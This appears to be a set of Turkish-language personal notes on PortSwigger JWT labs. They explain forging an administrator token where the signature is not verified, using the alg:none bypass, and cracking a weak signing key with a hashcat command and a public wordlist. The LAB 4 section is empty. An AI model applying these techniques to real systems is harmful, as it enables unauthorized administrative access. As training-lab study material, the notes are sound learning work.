# LAB 1 :

wiener | peter olarak giriş yap 
`/admin` paneli var burada `administrator`'a bir panel açılmış 
sessiondaki JWT tokenine bak

```jwt
eyJraWQiOiJmYTkzNDdkNi1lNGNlLTQ5MjQtOWNjZC1kZTJiY2I1ZmExODEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0NzE1MzI4OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.CbRy0ehUOur7XKMXLvVeaayPE9eEgSNGLA7Og2nB6xg5AxWJLG4_O9Qw5qNCZY1zBnxWe89ZwK8Q4u9EfYXjOMuCJ8dpEDvVeKkk3DgCLAfckL9MDf_MvxqXg4BPZyQ6JsWytysbAEySBpYGYkFNQDtqleDA0_z5jCsMrvuzlsE5Os9w6Kpds9lOzPcvhhQpehn6saJkuDYM44DvfnuCNVta06Ry5huC8v9tEDdDDRblcjogiIpi_RnT1u6z3-toGqCz8UeEzhdrYrLMyhguaLJqsGHug9u5g8_yWF3G10YQ2TnDMoLcSNvIBLcc_V4ZVMOSxWL5JlLsL1PR3W4ZjA
```

tokende payload kısmı 

```
{
  "iss": "portswigger",
  "exp": 1747153288,
  "sub": "wiener"
}
```
şeklinde 
```
{
  "iss": "portswigger",
  "exp": 1747153288,
  "sub": "administrator"
}
```
olarak değiştir çünkü `verify` işlemi yapılmamış.


# LAB 2 alg: none

bazı serverlarda alg none olarak belirlemek signature gerektirmeden sisteme giriş yapabilmemizi sağlar.

header kısmındaki alg none girerek ve signature kısmını boş bırakarak (payload kısmını yine `.` kullanarak bitirmen gerekir.)

## LAB 3 weak sign key

sign key zayıf bir değer girilirse brute-force atabilirsin.
https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

```powershell
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
ile şifreyi kırdık ve şifre : `secret1`  bu şekilde tekrar json tokenimizi bu şifre üzerinden üreteceğiz 

Burpde : 
![[Pasted image 20250513210938.png]]
şeklinde değiştirilebilir. burada alg: none ataklar da varmış


## LAB 4 